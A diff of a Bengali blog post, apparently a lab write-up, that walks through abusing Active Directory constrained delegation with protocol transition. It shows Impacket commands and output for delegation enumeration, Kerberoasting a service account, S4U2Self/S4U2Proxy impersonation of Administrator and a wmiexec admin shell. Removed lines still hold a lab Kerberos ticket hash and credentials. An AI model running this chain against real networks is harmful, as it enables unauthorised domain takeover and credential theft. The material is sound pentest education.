@@ -1,142 +1,157 @@
 ---
 date: '2026-06-07T12:00:38+06:00'
-draft: true
-title: 'লোকাল অ্যাডমিন (Local Admin) ছাড়াই কনস্ট্রেইনড ডেলিগেশন (Constrained Delegation) অ্যাবিউস করা'
+draft: false
+title: 'লোকাল অ্যাডমিন ছাড়াই কনস্ট্রেইন্ড ডেলিগেশন (Constrained Delegation)-এর অপব্যবহার'
+comments:
+  enabled: true
+  system: "giscus"
 ---
 
-অ্যাক্টিভ ডিরেক্টরি (Active Directory) পেনিট্রেশন টেস্টিংয়ে একটি প্রচলিত ভুল ধারণা রয়েছে যে, একটি কনস্ট্রেইনড ডেলিগেশন (Constrained Delegation) অ্যাটাক সফল করতে হলে আপনাকে প্রথমে একটি হোস্ট কম্প্রোমাইজ করতে হবে, লোকাল অ্যাডমিনিস্ট্রেটর হিসেবে প্রিভিলেজ এস্কেলেট (privilege escalate) করতে হবে এবং মেমরি থেকে ক্রেডেনশিয়াল ডাম্প করতে হবে।
+অ্যাক্টিভ ডিরেক্টরি (Active Directory) পেনিট্রেশন টেস্টিংয়ের ক্ষেত্রে একটি প্রচলিত ও দীর্ঘস্থায়ী ভুল ধারণা রয়েছে— একটি কনস্ট্রেইন্ড ডেলিগেশন (Constrained Delegation) আক্রমণ সফল করতে হলে আপনাকে প্রথমে কোনো হোস্টের নিয়ন্ত্রণ নিতে হবে, লোকাল অ্যাডমিনিস্ট্রেটর প্রিভিলেজে উন্নীত হতে হবে এবং মেমোরি থেকে ক্রেডেনশিয়াল ডাম্প করতে হবে।
 
-যদিও LSASS ডাম্প করা একটি স্ট্যান্ডার্ড পদ্ধতি, তবে এটি কোনো বাধ্যতামূলক শর্ত নয়। টার্গেট যদি দুর্বল পাসওয়ার্ড দিয়ে কনফিগার করা কোনো ইউজার অ্যাকাউন্ট হয়, তবে একজন সাধারণ ডোমেইন ইউজার (domain user) টার্গেট এন্ডপয়েন্টের ডিস্ক স্পর্শ না করেই বা কোনো এলিভেটেড প্রিভিলেজ (elevated privileges) ছাড়াই সম্পূর্ণ নেটওয়ার্কের মাধ্যমে একটি পূর্ণাঙ্গ ডেলিগেশন অ্যাটাক চালাতে পারে এবং ডোমেইন অ্যাডমিনিস্ট্রেটর (Domain Administrator) ইমপার্সোনেট করতে পারে।
+যদিও LSASS ডাম্প করা একটি স্ট্যান্ডার্ড বা সাধারণ প্রক্রিয়া, তবে এটি কোনো বাধ্যতামূলক শর্ত নয়। যদি টার্গেট অ্যাকাউন্টটি একটি দুর্বল পাসওয়ার্ড দিয়ে কনফিগার করা কোনো ইউজার অ্যাকাউন্ট হয়, তবে একজন সাধারণ ডোমেন ব্যবহারকারী সম্পূর্ণ নেটওয়ার্কের ওপর ভিত্তি করেই একটি পুর্ণাঙ্গ ডেলিগেশন অ্যাটাক চালাতে পারেন এবং কোনো টার্গেট এন্ডপয়েন্টের ডিস্ক স্পর্শ না করে বা উচ্চতর প্রিভিলেজের প্রয়োজন ছাড়াই ডোমেন অ্যাডমিনিস্ট্রেটর (Domain Administrator) হিসেবে ছদ্মবেশ ধারণ (Impersonation) করতে পারেন।
 
-কার্বেরোস্টিং (Kerberoasting) এবং প্রোটোকল ট্রানজিশন (Protocol Transition) এর সমন্বয় কীভাবে জিরো-অ্যাডমিন (zero-admin) ডোমেইন কম্প্রোমাইজের সুযোগ তৈরি করে, এখানে তার একটি বিশ্লেষণাত্মক ব্রেকডাউন দেওয়া হলো, যেখানে মূল ফোকাস থাকবে Kerberos S4U এক্সটেনশনগুলোর অন্তর্নিহিত মেকানিজমের ওপর।
+নিচে একটি বিশ্লেষণাত্মক বিবরণ দেওয়া হলো যে কীভাবে কার্বেরোস্টিং (Kerberoasting) এবং প্রোটোকল ট্রানজিশন (Protocol Transition)-এর পারস্পরিক সংযোগ কোনো অ্যাডমিন প্রিভিলেজ ছাড়াই ডোমেন কম্প্রোমাইজ করার সুযোগ তৈরি করে। এখানে মূলত কার্বেরোস S4U এক্সটেনশনের অভ্যন্তরীণ মেকানিজমের ওপর আলোকপাত করা হয়েছে।
 
-## ফেজ ১: মিসকনফিগারেশন শনাক্তকরণ (জিরো-টাচ এনিউমারেশন)
+## ফেজ ১: ভুল কনফিগারেশন সনাক্তকরণ (জিরো-টাচ এন্যুমারেশন)
 
-অ্যাটাকটি শুরু হয় একজন সাধারণ, আনপ্রিভিলেজড (unprivileged) ডোমেইন ইউজারের দৃষ্টিকোণ থেকে। এর উদ্দেশ্য হলো কনস্ট্রেইনড ডেলিগেশন (Constrained Delegation) কনফিগার করা অ্যাকাউন্টগুলো খোঁজার জন্য LDAP-এর মাধ্যমে অ্যাক্টিভ ডিরেক্টরিতে কোয়েরি করা।
+এই আক্রমণটি শুরু হয় একজন সাধারণ, প্রিভিলেজহীন ডোমেন ব্যবহারকারীর দৃষ্টিকোণ থেকে। উদ্দেশ্য হলো LDAP-এর মাধ্যমে অ্যাক্টিভ ডিরেক্টরিতে কোয়েরি করে কনস্ট্রেইন্ড ডেলিগেশন সহ কনফিগার করা অ্যাকাউন্টগুলো খুঁজে বের করা।
 
-Impacket-এর মাধ্যমে স্ট্যান্ডার্ড LDAP এনিউমারেশনের আউটপুটটি নিচে দেওয়া হলো:
-
-```bash
-impacket-findDelegation 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101
-
-```
-
-```text
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-AccountName  AccountType  DelegationType                      DelegationRightsTo                 SPN Exists 
------------  -----------  ----------------------------------  ---------------------------------  ----------
-THMDC$       Computer     Unconstrained                       N/A                                Yes        
-svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1.za.tryhackme.loc  Yes        
-svcIIS       Person       Constrained w/ Protocol Transition  WSMAN/THMSERVER1                   Yes        
-svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1.za.tryhackme.loc   No         
-svcIIS       Person       Constrained w/ Protocol Transition  http/THMSERVER1                    No         
-
-```
-
-**মেকানিজম:**
-
-এখানকার সবচেয়ে গুরুত্বপূর্ণ বিষয়টি হলো `Constrained w/ Protocol Transition`। অ্যাক্টিভ ডিরেক্টরিতে এটি `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D) ইউজার অ্যাকাউন্ট কন্ট্রোল ফ্ল্যাগের সাথে সম্পর্কিত।
-
-যখন কোনো সার্ভিস অ্যাকাউন্টে এই ফ্ল্যাগটি থাকে, তখন সেটি **S4U2Self** Kerberos এক্সটেনশন ব্যবহার করার অনুমতি পায়। এর মানে হলো `svcIIS` অ্যাকাউন্টটি ডোমেইনের *যেকোনো* ইউজারের হয়ে নিজের জন্য একটি সার্ভিস টিকেট রিকোয়েস্ট করতে পারে এবং এর জন্য ওই ইউজারের কোনো পাসওয়ার্ড দেওয়ার প্রয়োজন হয় না। `DelegationRightsTo` কলামটি নির্দেশ করে যে, পরবর্তীতে সেই টিকেট কোথায় ফরোয়ার্ড করা যাবে।
-
-যেহেতু `svcIIS` অ্যাকাউন্টটি একটি `Person` (মেশিন অ্যাকাউন্ট নয়, বরং একটি ইউজার অ্যাকাউন্ট) হিসেবে চিহ্নিত, তাই এর সাথে একটি Service Principal Name (SPN) যুক্ত থাকার প্রবল সম্ভাবনা রয়েছে, যা এটিকে অফলাইন অ্যাটাকের জন্য একটি উপযুক্ত টার্গেটে পরিণত করে।
-
-## ফেজ ২: নীরবে তথ্য বের করা (Kerberoasting)
-
-যদি `svcIIS` কোনো মেশিন অ্যাকাউন্ট (Machine Account) বা গ্রুপ ম্যানেজড সার্ভিস অ্যাকাউন্ট (gMSA) হতো, তবে মেমরি থেকে এর ১২০-ক্যারেক্টারের রোটেটিং পাসওয়ার্ডটি বের করার জন্য লোকাল অ্যাডমিনিস্ট্রেটর রাইটস (local administrator rights) এর প্রয়োজন হতো। কিন্তু, যেহেতু এটি একটি স্ট্যান্ডার্ড ইউজার অ্যাকাউন্ট, তাই Kerberos প্রোটোকল যেকোনো অথেনটিকেটেড ইউজারকে এর জন্য একটি Ticket Granting Service (TGS) টিকেটের রিকোয়েস্ট করার অনুমতি দেয়।
+Impacket-এর মাধ্যমে স্ট্যান্ডার্ড LDAP এন্যুমারেশন আউটপুট লক্ষ্য করলে দেখা যায়:
 
 ```bash
-impacket-GetUserSPNs 'za.tryhackme.loc/t2_leon.francis:Password!1' -dc-ip 10.200.72.101 -request-user svcIIS -outputfile svciis_hash.txt
-
-```
-
-```text
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
-
-ServicePrincipalName              Name    MemberOf  PasswordLastSet             LastLogon                   Delegation  
---------------------------------  ------  --------  --------------------------  --------------------------  -----------
-HTTP/svcServWeb.za.tryhackme.loc  svcIIS            2022-04-29 06:50:25.152583  2026-06-06 02:39:59.678483  constrained 
+impacket-findDelegation 'corp.local/j.smith:Password!1' -dc-ip 192.168.100.10
 
 ```
 
 ```bash
-cat svciis_hash.txt 
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+AccountName  AccountType  DelegationType                      DelegationRightsTo             SPN Exists
+-----------  -----------  ----------------------------------  -----------------------------  ----------
+DC01$        Computer     Unconstrained                       N/A                            Yes
+svc_web      Person       Constrained w/ Protocol Transition  WSMAN/APP01.corp.local        Yes
+svc_web      Person       Constrained w/ Protocol Transition  WSMAN/APP01                   Yes
+svc_web      Person       Constrained w/ Protocol Transition  HTTP/APP01.corp.local         No
+svc_web      Person       Constrained w/ Protocol Transition  HTTP/APP01                    No
 
 ```
 
-```text
-$krb5tgs$23$*svcIIS$ZA.TRYHACKME.LOC$za.tryhackme.loc/svcIIS*$7a12eb6bc2931fcdce8642b84802abf3$de111089e45e098cae387582a264b65134254d525944fad820e2fa158049f95997a8e433152464da942d3fe8732aee21a026fa9bb6c5b921024a9afa21fe9996142b131e0fda7e363be164c241a1ccf22f896275c5336fa28efb1c56fcfbb573a172eff6f696092b9246e62265c69436fa0fb05b3b3eb85554238b793803ad4f20bb43d852617c3bbbecfa882b681b55c2799bc8f0d0fd20b42f909c07f0daa10330c70986c28d9fe805bbc4658e0c91bf3d018580c383090f6b2c261780c66981b122692341e941bed71523cef3e45f80ae021eaa0401505ff9953b577e8d80d639e6dd311bbda0f4663835954a0177076afd4dd28413840786f0978fc346e9b2a9582fcd4ba063b1aea416d7c24ea16c001c282cde5dc6e595674c94a7f909097c777b26cbcccdf08631a041d2133d7f7ad0251869271162e2fbcf297b889c3962fe79c773b855f33ddfebe2f0f8fb1c2db1dd953265fb053593ca86f8cfc7286d0209c5817ebf07dbaec3cc729c60aa157385caa6d43e6d05b202044c9dfab264c2e31417de824d6df97b0151416daed3019c9f14dd720283046615adfb09033d664603170317b8bc441b745e06fc50ca4dca29d795a6adafbcc8e76892854cd8a6f9e6e7d0e3289f96825537ca4f2816fe0760bfc519bcc4a8e75c746e70437233da7ee2c2eaf4c029ba52db618e83894a043e3bd0e879e01fc331fec4aa0f94b60dcc9c8dc9687b8e6d3844928a1972afe26a2a365047c164663689da81ec49dedb8c78cdffd8ae8db066d616890808d6de02f65914d4476235654684b1d62bedf952ad217ca34271115b30254df47272b8601f420de177dfaa569f9b22aa597616a94a25c8e7e43c02a9b6f2c715ddbc80254c7fd6bea60a8b96aa897596709d2bafb476a90aa4a5e3899ecdbabc5bf2419ca819973c5f6d84a0b64c712b0236c63bcdc8e55e3431f0a1763065f4ad8932376be754c6fcaf07e0318cbcaf0974e81ce4015e230a37bca6e0479440349afba0f0cd95f19eae02c40bbffdb48aff8c0501a787f11447a1b7350b4246b2aa27ee146de7e2c7386b82a52fa0f4631a05d14f47c12df65a7aff10d1a73c1856e729672771b502e591cf22334132f037a91cdb3aabccb28b86d844fe65f9fa482b7cd58912ede84524284ea930b3e976a4c4e00294d4c564f6e7acdc4d461e7e4d084e44f01e242aad481ba591381dd5ac767d236c5fc836695df90bb7f6d2db3fc7a2970218ed765e0fecf4f7fb6b71b6bd1ccf1ed2ba83c7b5e07cf2cbb7168ab4f837241dcb841f7cf64253684cd82b3ab6e2d54db8843149eaee768198aca08c4f91229a26cd5682ea1b5e774e0b62fa4931a47a2e7623471b83d2453608741e848812316a01df8e749789dec723b9e9083e1c
+**অভ্যন্তরীণ মেকানিজম (The Mechanics):**
 
-```
+এখানে সবচেয়ে গুরুত্বপূর্ণ বিষয়টি হলো `Constrained w/ Protocol Transition`। অ্যাক্টিভ ডিরেক্টরিতে এটি `TRUSTED_TO_AUTH_FOR_DELEGATION` (T2A4D) ইউজার অ্যাকাউন্ট কন্ট্রোল ফ্ল্যাগের সাথে সম্পর্কিত।
 
-**মেকানিজম:**
+যখন কোনো সার্ভিস অ্যাকাউন্টে এই ফ্ল্যাগটি থাকে, তখন সেটি **S4U2Self** কার্বেরোস এক্সটেনশন ব্যবহার করার অনুমতি পায়। এর অর্থ হলো `svc_web` অ্যাকাউন্টটি ডোমেনের *যেকোনো* ব্যবহারকারীর পক্ষ থেকে নিজের জন্য একটি সার্ভিস টিকিটের অনুরোধ করতে পারে, যার জন্য ওই ব্যবহারকারীর পাসওয়ার্ডের প্রয়োজন হয় না। `DelegationRightsTo` কলামটি নির্ধারণ করে যে সেই টিকিটটি পরবর্তীতে কোথায় পাঠানো বা ফরওয়ার্ড করা যাবে।
 
-ডোমেইন কন্ট্রোলার (Domain Controller) `svcIIS` অ্যাকাউন্টের পাসওয়ার্ডের RC4-HMAC হ্যাশ দ্বারা এনক্রিপ্ট করা একটি TGS রিটার্ন করে। অ্যাটাকারের কাছে এখন `svcIIS` হিসেবে অথেনটিকেট করার জন্য প্রয়োজনীয় ক্রিপ্টোগ্রাফিক ম্যাটেরিয়াল রয়েছে। এই হ্যাশটি অফলাইনে নিয়ে ক্র্যাক করার মাধ্যমে (যেমন, `Password1@` উদ্ধার করে), অ্যাটাকার টার্গেট IIS সার্ভারে কোনো কোড এক্সিকিউট না করেই সার্ভিস অ্যাকাউন্টটির সম্পূর্ণ নিয়ন্ত্রণ পেয়ে যায়।
+যেহেতু `svc_web`-কে একটি `Person` (ইউজার অ্যাকাউন্ট, মেশিন অ্যাকাউন্ট নয়) হিসেবে চিহ্নিত করা হয়েছে, তাই এটির সাথে একটি সার্ভিস প্রিন্সিপাল নেম (SPN) যুক্ত থাকার সম্ভাবনা প্রবল, যা এটিকে অফলাইন আক্রমণের জন্য একটি উপযুক্ত লক্ষ্যে পরিণত করে।
 
-## ফেজ ৩: ভিআইপি পাস তৈরি করা (S4U2Self এবং S4U2Proxy)
+## ফেজ ২: নীরবে হ্যাশ নিষ্কাশন (কার্বেরোস্টিং)
 
-এখান থেকেই মূলত জিরো-অ্যাডমিন (zero-admin) অ্যাটাকের বিষয়টি পরিষ্কার হয়ে ওঠে। প্লেইনটেক্সট (plaintext) পাসওয়ার্ডটি উদ্ধার করার পর, অ্যাটাকার এর NT Hash (`43460d636f269c709b20049cee36ae7a`) বের করে নেয় এবং প্রোটোকল অ্যাবিউস (protocol abuse) শুরু করে।
+যদি `svcIIS` (বা `svc_web`) একটি মেশিন অ্যাকাউন্ট বা গ্রুপ ম্যানেজড সার্ভিস অ্যাকাউন্ট (gMSA) হতো, তবে মেমোরি থেকে এর ১২০-অক্ষরের পরিবর্তনশীল পাসওয়ার্ডটি বের করার জন্য লোকাল অ্যাডমিনিস্ট্রেটর রাইটসের প্রয়োজন হতো। কিন্তু, যেহেতু এটি একটি সাধারণ ইউজার অ্যাকাউন্ট, তাই কার্বেরোস প্রোটোকল যেকোনো অথেন্টিকেটেড ব্যবহারকারীকে এর জন্য একটি টিকিট গ্রান্টিং সার্ভিস (TGS) টিকিটের অনুরোধ করার অনুমতি দেয়।
 
 ```bash
-impacket-getST za.tryhackme.loc/svcIIS -hashes :43460d636f269c709b20049cee36ae7a -spn wsman/THMSERVER1.za.tryhackme.loc -impersonate Administrator -k
+impacket-GetUserSPNs 'corp.local/j.smith:Password!1' \
+-dc-ip 192.168.100.10 \
+-request-user svc_web \
+-outputfile svcweb_hash.txt
 
 ```
 
-```text
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+```bash
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
+
+ServicePrincipalName          Name      MemberOf  PasswordLastSet             LastLogon                   Delegation
+----------------------------  --------  --------  --------------------------  --------------------------  -----------
+HTTP/webapp.corp.local        svc_web             2025-01-10 09:15:22.000000  2026-06-06 02:39:59.678483 constrained
+
+```
+
+```bash
+cat svcweb_hash.txt
+
+```
+
+```bash
+$krb5tgs$23$*svc_web$CORP.LOCAL$corp.local/svc_web*$<REDACTED_TGS_HASH>
+
+```
+
+**অভ্যন্তরীণ মেকানিজম (The Mechanics):**
+
+ডোমেন কন্ট্রোলার একটি TGS রিটার্ন করে যা `svc_web` অ্যাকাউন্টের পাসওয়ার্ডের RC4-HMAC হ্যাশ দ্বারা এনক্রিপ্ট করা থাকে। আক্রমণকারী এখন `svc_web` হিসেবে অথেন্টিকেট করার জন্য প্রয়োজনীয় ক্রিপ্টোগ্রাফিক উপাদান পেয়ে গেছেন। এই হ্যাশটি অফলাইনে নিয়ে ক্র্যাক করার মাধ্যমে (যা ধরুন `Password1@` পাসওয়ার্ডটি প্রকাশ করে), আক্রমণকারী আইআইএস (IIS) সার্ভারে কোনো কোড এক্সিকিউট না করেই সার্ভিস অ্যাকাউন্টটির পুর্ণ নিয়ন্ত্রণ পেয়ে যান।
+
+## ফেজ ৩: ভিআইপি পাস তৈরি (S4U2Self এবং S4U2Proxy)
+
+ঠিক এই ধাপেই লোকাল অ্যাডমিন ছাড়া ডোমেন কম্প্রোমাইজ করার বিষয়টি বাস্তবে রূপ নেয়। প্লেইনটেক্সট পাসওয়ার্ড উদ্ধার করার পর, আক্রমণকারী এর এনটি হ্যাশ (NT Hash: `43460d636f269c709b20049cee36ae7a`) বের করেন এবং প্রোটোকলের অপব্যবহার শুরু করেন।
+
+```bash
+impacket-getST corp.local/svc_web \
+-hashes :43460d636f269c709b20049cee36ae7a \
+-spn wsman/APP01.corp.local \
+-impersonate Administrator \
+-k
+
+```
+
+```bash
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [-] CCache file is not found. Skipping...
 [*] Getting TGT for user
 [*] Impersonating Administrator
-[*] Requesting S4U2self
+[*] Requesting S4U2Self
 [*] Requesting S4U2Proxy
-[*] Saving ticket in Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache
+[*] Saving ticket in Administrator@wsman_APP01.corp.local@CORP.LOCAL.ccache
 
 ```
 
-**মেকানিজম:**
+**অভ্যন্তরীণ মেকানিজম (The Mechanics):**
 
-এই একটি মাত্র কমান্ড পুরো নেটওয়ার্ক জুড়ে কনস্ট্রেইনড ডেলিগেশন অ্যাটাকের মূল কাজটি সম্পন্ন করে:
+এই একটিমাত্র কমান্ড সম্পূর্ণ নেটওয়ার্কের ওপর ভিত্তি করে কনস্ট্রেইন্ড Delegation আক্রমণের মূল অংশটি এক্সিকিউট করে:
 
-১. **S4U2Self:** অ্যাটাকার `svcIIS` হিসেবে অথেনটিকেট করে এবং `Administrator` অ্যাকাউন্টের হয়ে নিজের জন্য একটি টিকেটের রিকোয়েস্ট করে। যেহেতু `svcIIS` এর প্রোটোকল ট্রানজিশন (Protocol Transition) এনাবেল করা আছে, তাই ডোমেইন কন্ট্রোলার রিকোয়েস্টটি গ্রহণ করে এবং একটি ফরোয়ার্ডেবল (forwardable) টিকেট ইস্যু করে।
+1. **S4U2Self:** আক্রমণকারী `svc_web` হিসেবে অথেন্টিকেট করেন এবং `Administrator` অ্যাকাউন্টের পক্ষ থেকে নিজের জন্য একটি টিকিটের অনুরোধ করেন। যেহেতু `svc_web`-এর প্রোটোকল ট্রানজিশন সক্রিয় করা আছে, ডোমেন কন্ট্রোলার অনুরোধটি গ্রহণ করে এবং একটি ফরওয়ার্ডযোগ্য (forwardable) টিকিট ইস্যু করে।
+2. **S4U2Proxy:** আক্রমণকারী অবিলম্বে সেই ফরওয়ার্ডযোগ্য টিকিটটি নিয়ে ডোমেন কন্ট্রোলারে পুনরায় পেশ করেন এবং LDAP এন্যুমারেশনে নির্ধারিত ডাউনস্ট্রিম সার্ভিস (`wsman/APP01`)-এ অ্যাক্সেসের অনুরোধ জানান।
+3. **ফলাফল:** ডোমেন কন্ট্রোলার (DC) একটি বৈধ কার্বেরোস সার্ভিস টিকিট ইস্যু করে যা প্রমাণ করে যে আক্রমণকারী ওই নির্দিষ্ট সার্ভিসের জন্য ডোমেন `Administrator`।
 
-২. **S4U2Proxy:** অ্যাটাকার সাথে সাথেই সেই ফরোয়ার্ডেবল টিকেটটি নেয় এবং সেটিকে পুনরায় ডোমেইন কন্ট্রোলারের কাছে উপস্থাপন করে, যা LDAP এনিউমারেশনে (যেমন `wsman/THMSERVER1`) সংজ্ঞায়িত ডাউনস্ট্রিম সার্ভিসে অ্যাক্সেস করার জন্য রিকোয়েস্ট করে।
+পুরো প্রক্রিয়ার কোথাও `Administrator`-এর পাসওয়ার্ড অনুমান (Guess) করার প্রয়োজন হয়নি, কিংবা কোনো উচ্চতর প্রিভিলেজড সেশনেরও দরকার পড়েনি।
 
-৩. **ফলাফল:** ডোমেইন কন্ট্রোলার একটি বৈধ Kerberos Service Ticket ইস্যু করে, যা প্রমাণ করে যে অ্যাটাকার সেই নির্দিষ্ট সার্ভিসের জন্য ডোমেইন `Administrator`।
+## ফেজ ৪: বাস্তবসম্মত প্রভাব বিস্তার (Impact Execution)
 
-পুরো প্রক্রিয়ার কোনো পর্যায়েই `Administrator` পাসওয়ার্ড গেস বা অনুমান করার প্রয়োজন হয়নি, এবং কোনো এলিভেটেড সেশনেরও (elevated session) দরকার পড়েনি।
-
-## ফেজ ৪: রিয়ালিস্টিক ইমপ্যাক্ট এক্সিকিউশন (বাস্তব প্রভাব)
-
-এই তৈরি করা (forged) টিকেটটি লোকাল ক্রেডেনশিয়াল ক্যাশে (local credential cache) এক্সপোর্ট করার পর, অ্যাটাকার টার্গেট সার্ভারের সাথে ইন্টারঅ্যাক্ট করার জন্য WMI (Windows Management Instrumentation) বা WinRM-এর মতো নেটিভ রিমোট অ্যাডমিনিস্ট্রেশন প্রোটোকলগুলো ব্যবহার করতে পারে।
+তৈরি করা জাল টিকিটটি লোকাল ক্রেডেনশিয়াল ক্যাশে এক্সপোর্ট করার পর, আক্রমণকারী টার্গেট সার্ভারের সাথে যোগাযোগ করতে WMI (Windows Management Instrumentation) বা WinRM-এর মতো নেটিভ রিমোট অ্যাডমিনিস্ট্রেশন প্রোটোকল ব্যবহার করতে পারেন।
 
 ```bash
-export KRB5CCNAME=Administrator@wsman_THMSERVER1.za.tryhackme.loc@ZA.TRYHACKME.LOC.ccache
+export KRB5CCNAME=Administrator@wsman_APP01.corp.local@CORP.LOCAL.ccache
 
 ```
 
 ```bash
-impacket-wmiexec -k -no-pass za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc
+impacket-wmiexec -k -no-pass \
+corp.local/Administrator@APP01.corp.local
 
 ```
 
-```text
-za.tryhackme.loc/Administrator@THMSERVER1.za.tryhackme.loc
-Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+```bash
+corp.local/Administrator@APP01.corp.local
+
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies
 
 [*] SMBv3.0 dialect used
-[!] Launching semi-interactive shell - Careful what you execute
+
+[!] Launching semi-interactive shell
 [!] Press help for extra shell commands
+
 C:\>whoami
-za\administrator
+corp\administrator
+
+C:\>hostname
+APP01
 
 C:\>
 
 ```
 
-**প্রভাব (Impact):**
+**প্রভাব (The Impact):**
 
-এই অ্যাটাক পাথের ডেটা ইন্টিগ্রিটি মূল্যায়ন করলে এর ভয়াবহতা পরিষ্কার হয়ে যায়। একজন লো-প্রিভিলেজ (low-privilege) অ্যাটাকার সিকিউরিটি বাউন্ডারি বাইপাস করার জন্য একটি স্ট্যান্ডার্ড প্রোটোকল ফিচার ব্যবহার করেছে, যার ফলে একটি সেনসিটিভ সার্ভারে সে ইন্টারঅ্যাকটিভ `administrator` লেভেলের শেল পেয়ে গেছে।
+এই অ্যাটাক পাথের ডেটা ইন্টিগ্রিটি বা কার্যকারিতা মূল্যায়ন করলে এর ভয়াবহতা স্পষ্ট হয়ে ওঠে। একজন কম-প্রিভিলেজড আক্রমণকারী সিকিউরিটি বাউন্ডারি বাইপাস করতে একটি স্ট্যান্ডার্ড প্রোটোকল ফিচারের অপব্যবহার করেছেন, যার ফলে একটি অত্যন্ত সংবেদনশীল সার্ভারে ইন্টারঅ্যাক্টিভ `administrator` লেভেলের শেল পাওয়া সম্ভব হয়েছে।
 
-অ্যাটাকারদের ডেলিগেশন অ্যাবিউস করার জন্য প্রথমে এন্ডপয়েন্টগুলো কম্প্রোমাইজ করতে হবে—এমন ধারণার ওপর নির্ভর করাটা একটি মারাত্মক ব্লাইন্ড স্পট বা দুর্বলতা তৈরি করে। যতক্ষণ পর্যন্ত প্রোটোকল ট্রানজিশনের সাথে ক্র্যাক করার যোগ্য (crackable) পাসওয়ার্ড যুক্ত থাকবে, ততক্ষণ নেটওয়ার্কটি রিমোট এবং আনপ্রিভিলেজড ডোমেইন কম্প্রোমাইজের ঝুঁকির মধ্যে থাকবে।
+ডেলিগেশনের অপব্যবহার করার জন্য আক্রমণকারীদের প্রথমে এন্ডপয়েন্ট কম্প্রোমাইজ করতে হবে— এই ধারণার ওপর ভরসা করে থাকা একটি বিপজ্জনক অন্ধবিন্দু (blind spot) তৈরি করে। যতদিন প্রোটোকল ট্রানজিশনের সাথে ক্র্যাক করা সম্ভব এমন দুর্বল পাসওয়ার্ড যুক্ত থাকবে, ততদিন নেটওয়ার্কগুলো দূরবর্তী বা রিমোটলি যেকোনো প্রিভিলেজহীন ব্যবহারকারীর মাধ্যমে ডোমেন কম্প্রোমাইজের ঝুঁকিতে থাকবে।
